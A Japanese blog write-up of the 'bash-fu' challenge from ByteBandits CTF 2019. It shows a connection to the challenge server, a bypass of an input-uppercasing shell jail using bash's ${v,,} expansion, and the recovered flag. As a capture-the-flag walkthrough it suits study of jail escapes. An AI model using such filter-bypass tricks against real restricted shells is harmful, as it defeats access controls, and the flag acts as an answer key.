---
title: bash-fu (ByteBandits CTF 2019)
date: 2019-04-14
tags: ["ByteBandits CTF 2019"]
categories: [CTF, misc]
---

{% asset_img problem.png %}

## 解説

とりあえず `nc 13.234.130.76 7002` を実行する。

```shell
$ nc 13.234.130.76 7002
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
bash-4.4$ ls
ls
bash: LS: command not found
bash-4.4$ pwd
pwd
bash: PWD: command not found
```

一瞬、`CAPSLOCK` がバグったのかと思ったけど、そうではなくこれが問題だった。

入力した文字が全て大文字として解釈されるため、コマンドが何も実行できないという感じ。

ちょっと調べたら `${v,,}` で小文字にできることがわかったので、あとは簡単だった。

```shell
bash-4.4$ l="ls /"
bash-4.4$ ${l,,}
${l,,}
bin    etc    jail   media  opt    root   sbin   sys    usr
dev    home   lib    mnt    proc   run    srv    tmp    var
```

`jail` っていうディレクトリは普通存在しないし、普通に怪しいのでこの中を ls してみる。

```shell
bash-4.4$ l="ls /jail/"
bash-4.4$ ${l,,}
${l,,}
flag.txt  jail
```

`flag.txt` にたぶんフラグが書いてあるだろうから、`cat` して終わり。

```shell
bash-4.4$ l="cat /jail/flag.txt"
l="cat /jail/flag.txt"
bash-4.4$ ${l,,}
${l,,}
flag{b@$h_jails_are_3asy_p3@sy}
```

### 失敗談

最初は `l="bash"` で入って `cat /jial/flag.txt` したんだけど、なぜか上手く行かなかった。

今試してみたら上手くいったので、何か変なことしてたんだろうなぁ・・・。

```shell
bash-4.4$ l="bash"; ${l,,}
l="bash"; ${l,,}
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
bash: /root/.bashrc: Permission denied

bash-4.4$ ls -al /jail/
ls -al /jail/
total 16
drwxr-xr-x    1 root     root          4096 Apr 13 03:22 .
drwxr-xr-x    1 root     root          4096 Apr 13 14:30 ..
-rw-r--r--    1 root     root            32 Apr 11 21:32 flag.txt
-rwxrwxrwx    1 root     root           466 Apr 12 16:45 jail

bash-4.4$ cat /jail/flag.txt
cat /jail/flag.txt
flag{b@$h_jails_are_3asy_p3@sy}
```

## フラグ

`flag{b@$h_jails_are_3asy_p3@sy}`

## 参考リソース

- [Bashで変数を大文字小文字変換(uppercase/lowercase)する](https://qiita.com/kawaz/items/211266021515b3f033a3)